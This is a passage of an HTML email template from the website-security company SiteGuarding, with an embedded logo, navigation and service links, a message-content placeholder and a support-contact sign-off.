              <td width="267" height="60" bgcolor="#fff" style="padding: 5px; background-color: #fff;"><a href="http://www.siteguarding.com/" target="_blank"><img src="data:image/png;base64,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" alt="SiteGuarding - Protect your website from unathorized access, malware and other threat" height="60" border="0" style="display:block" /></a></td>
              <td width="400" height="60" align="right" bgcolor="#fff" style="background-color: #fff;">
              <table border="0" cellspacing="0" cellpadding="0" bgcolor="#fff" style="background-color: #fff;">
                <tr>
                  <td style="font-family:Arial, Helvetica, sans-serif; font-size:11px;"><a href="http://www.siteguarding.com/en/login" target="_blank" style="color:#656565; text-decoration: none;">Login</a></td>
                  <td width="15"></td>
                  <td width="1" bgcolor="#656565"></td>
                  <td width="15"></td>
                  <td style="font-family:Arial, Helvetica, sans-serif; font-size:11px;"><a href="http://www.siteguarding.com/en/prices" target="_blank" style="color:#656565; text-decoration: none;">Services</a></td>
                  <td width="15"></td>
                  <td width="1" bgcolor="#656565"></td>
                  <td width="15"></td>
                  <td style="font-family:Arial, Helvetica, sans-serif; font-size:11px;"><a href="http://www.siteguarding.com/en/what-to-do-if-your-website-has-been-hacked" target="_blank" style="color:#656565; text-decoration: none;">Security Tips</a></td>            
                  <td width="15"></td>
                  <td width="1" bgcolor="#656565"></td>
                  <td width="15"></td>
                  <td style="font-family:Arial, Helvetica, sans-serif;  font-size:11px;"><a href="http://www.siteguarding.com/en/contacts" target="_blank" style="color:#656565; text-decoration: none;">Contacts</a></td>
                  <td width="30"></td>
                </tr>
              </table>
              </td>
            </tr>
          </table></td>
        </tr>

        <tr>
          <td width="750" height="2" bgcolor="#D9D9D9"></td>
        </tr>
        <tr>
          <td width="750" bgcolor="#fff" ><table width="750" border="0" cellspacing="0" cellpadding="0" bgcolor="#fff" style="background-color:#fff;">
            <tr>
              <td width="750" height="30"></td>
            </tr>
            <tr>
              <td width="750">
                <table width="750" border="0" cellspacing="0" cellpadding="0" bgcolor="#fff" style="background-color:#fff;">
                <tr>
                  <td width="30"></td>
                  <td width="690" bgcolor="#fff" align="left" style="background-color:#fff; font-family:Arial, Helvetica, sans-serif; color:#000000; font-size:12px;">
                    <br />
                    {MESSAGE_CONTENT}
                  </td>
                  <td width="30"></td>
                </tr>
              </table></td>
            </tr>
            <tr>
              <td width="750" height="15"></td>
            </tr>
            <tr>
              <td width="750" height="15"></td>
            </tr>
            <tr>
              <td width="750"><table width="750" border="0" cellspacing="0" cellpadding="0">
                <tr>
                  <td width="30"></td>
                  <td width="690" align="left" style="font-family:Arial, Helvetica, sans-serif; color:#000000; font-size:12px;"><strong>How can we help?</strong><br />
                    If you have any questions please dont hesitate to contact us. Our support team will be happy to answer your questions 24 hours a day, 7 days a week. You can contact us at <a href="mailto:support@siteguarding.com" style="color:#2C8D2C;"><strong>support@siteguarding.com</strong></a>.<br />
                    <br />
                    Thanks again for choosing SiteGuarding as your security partner!<br />
                    <br />
                    <span style="color:#2C8D2C;"><strong>SiteGuarding Team</strong></span><br />
                    <span style="font-family:Arial, Helvetica, sans-serif; color:#000; font-size:11px;"><strong>We will help you to protect your website from unauthorized access, malware and other threats.</strong></span></td>
                  <td width="30"></td>
                </tr>
              </table></td>
            </tr>
            <tr>
              <td width="750" height="30"></td>
            </tr>
          </table></td>
        </tr>
        <tr>
          <td width="750" height="2" bgcolor="#D9D9D9"></td>
        </tr>
      </table>
      <table width="750" border="0" cellspacing="0" cellpadding="0">
        <tr>
          <td width="750" height="10"></td>
        </tr>
        <tr>
          <td width="750" align="center"><table border="0" cellspacing="0" cellpadding="0">
            <tr>
              <td style="font-family:Arial, Helvetica, sans-serif; color:#ffffff; font-size:10px;"><a href="http://www.siteguarding.com/en/website-daily-scanning-and-analysis" target="_blank" style="color:#656565; text-decoration: none;">Website Daily Scanning</a></td>
              <td width="15"></td>
              <td width="1" bgcolor="#656565"></td>
              <td width="15"></td>
              <td style="font-family:Arial, Helvetica, sans-serif; color:#ffffff; font-size:10px;"><a href="http://www.siteguarding.com/en/malware-backdoor-removal" target="_blank" style="color:#656565; text-decoration: none;">Malware & Backdoor Removal</a></td>
              <td width="15"></td>
              <td width="1" bgcolor="#656565"></td>
              <td width="15"></td>
              <td style="font-family:Arial, Helvetica, sans-serif; color:#ffffff; font-size:10px;"><a href="http://www.siteguarding.com/en/update-scripts-on-your-website" target="_blank" style="color:#656565; text-decoration: none;">Security Analyze & Update</a></td>
              <td width="15"></td>
              <td width="1" bgcolor="#656565"></td>
              <td width="15"></td>
              <td style="font-family:Arial, Helvetica, sans-serif; color:#ffffff; font-size:10px;"><a href="http://www.siteguarding.com/en/website-development-and-promotion" target="_blank" style="color:#656565; text-decoration: none;">Website Development</a></td>
            </tr>
          </table></td>
        </tr>

        <tr>
          <td width="750" height="10"></td>
        </tr>
        <tr>
          <td width="750" align="center" style="font-family: Arial,Helvetica,sans-serif; font-size: 10px; color: #656565;">Add <a href="mailto:support@siteguarding.com" style="color:#656565">support@siteguarding.com</a> to the trusted senders list.</td>
        </tr>
      </table>
